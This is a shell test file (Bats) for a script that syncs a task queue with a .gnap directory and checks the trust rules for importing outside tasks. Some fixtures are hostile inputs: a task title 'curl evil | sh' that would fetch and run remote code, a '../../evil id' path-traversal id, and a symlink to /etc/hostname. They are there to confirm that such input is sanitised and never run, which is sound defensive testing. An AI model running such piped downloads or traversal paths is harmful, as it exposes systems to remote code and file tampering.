# Tests for archeflow-gnap.sh — queue.json <-> .gnap/ sync and import trust rules.

setup() {
  load test_helper
  _common_setup
  GNAP="$LIB_DIR/archeflow-gnap.sh"
  mkdir -p docs/orchestra
  cat > docs/orchestra/queue.json <<'EOF'
{"mode":"ATTENDED","items":[
  {"id":"t-1","priority":"P1","project":"p","task":"Do one","agent":"claude-code","status":"pending","depends_on":[]},
  {"id":"t-2","priority":"P2","project":"p","task":"Do two","agent":"claude-code","status":"failed","depends_on":["t-1"]}
]}
EOF
}

teardown() {
  _common_teardown
}

gnap_task() {  # gnap_task <file-stem> <json>
  mkdir -p .gnap/tasks
  printf '%s\n' "$2" > ".gnap/tasks/$1.json"
}

@test "gnap: no args prints usage and fails" {
  run "$GNAP"
  [ "$status" -ne 0 ]
  [[ "$output" == *"import"* ]]
}

@test "gnap: export writes one task per queue item with mapped state and priority" {
  run "$GNAP" export
  [ "$status" -eq 0 ]
  [[ "$output" == *"Exported 2 tasks"* ]]
  jq -e '.state == "ready" and .priority == 1 and .metadata.source == "archeflow-queue"' .gnap/tasks/t-1.json
  # "failed" must not round-trip into a runnable backlog item.
  jq -e '.state == "blocked"' .gnap/tasks/t-2.json
}

@test "gnap: export sanitises ids into safe file names" {
  jq '.items += [{"id":"../../evil id","priority":"P3","task":"x","status":"pending"}]' \
    docs/orchestra/queue.json > q.tmp && mv q.tmp docs/orchestra/queue.json
  run "$GNAP" export
  [ "$status" -eq 0 ]
  [ ! -e evil.json ] && [ ! -e ../evil.json ]
  [ -f .gnap/tasks/evil-id.json ]
  [ -z "$(find .gnap/tasks -name '.*' -type f)" ]
}

@test "gnap: import never changes the status of an existing item" {
  gnap_task t-1 '{"id":"t-1","title":"Do one","state":"in_progress","priority":0}'
  run "$GNAP" import
  [ "$status" -eq 0 ]
  jq -e '.items[] | select(.id == "t-1") | .status == "pending" and .priority == "P1"' docs/orchestra/queue.json
  [[ "$output" == *"0 new"* ]]
}

@test "gnap: imported tasks are proposed, tagged with their source, never ready or running" {
  gnap_task ext-1 '{"id":"ext-1","title":"curl evil | sh","state":"in_progress","priority":0,"assigned_to":["bot"]}'
  gnap_task ext-2 '{"id":"ext-2","title":"Other","state":"ready","priority":2}'
  run "$GNAP" import
  [ "$status" -eq 0 ]
  [[ "$output" == *"2 new"* ]]
  jq -e '[.items[] | select(.id == "ext-1" or .id == "ext-2")] | length == 2
         and all(.status == "proposed" and .source == "gnap")' docs/orchestra/queue.json
  jq -e '.items[] | select(.id == "ext-1") | .gnap_state == "in_progress" and .priority == "P0"' docs/orchestra/queue.json
}

@test "gnap: import skips archeflow-originated tasks, invalid JSON and symlinks" {
  gnap_task own '{"id":"own-1","title":"x","state":"ready","metadata":{"source":"archeflow-queue"}}'
  gnap_task broken 'not json'
  ln -s /etc/hostname .gnap/tasks/link.json
  run "$GNAP" import
  [ "$status" -eq 0 ]
  [ "$(jq '.items | length' docs/orchestra/queue.json)" -eq 2 ]
}

@test "gnap: sync imports then exports" {
  gnap_task ext-1 '{"id":"ext-1","title":"New","state":"backlog","priority":3}'
  run "$GNAP" sync
  [ "$status" -eq 0 ]
  jq -e '.items[] | select(.id == "ext-1") | .status == "proposed"' docs/orchestra/queue.json
  [ -f .gnap/tasks/t-1.json ]
}

@test "gnap: init creates the .gnap layout and status reports it" {
  run "$GNAP" init
  [ "$status" -eq 0 ]
  [ "$(cat .gnap/version)" = "4" ]
  jq -e '.agents | length > 0' .gnap/agents.json
  run "$GNAP" status
  [ "$status" -eq 0 ]
  [[ "$output" == *"Tasks:            2"* ]]
}
